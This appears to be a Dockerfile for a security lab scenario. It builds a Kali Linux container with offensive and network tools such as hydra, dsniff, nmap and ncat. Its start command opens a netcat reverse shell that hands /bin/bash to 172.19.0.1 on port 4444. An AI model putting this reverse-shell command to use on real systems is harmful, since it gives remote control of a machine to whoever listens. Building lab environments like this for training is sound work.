FROM kalilinux/kali-rolling
WORKDIR /home/kali
COPY escenario_scripts/ .

RUN apt update && apt -y install dsniff hydra-gtk python3 net-tools iputils-ping ncat nmap ssh


CMD ["nc","172.19.0.1","4444","-e","/bin/bash"]

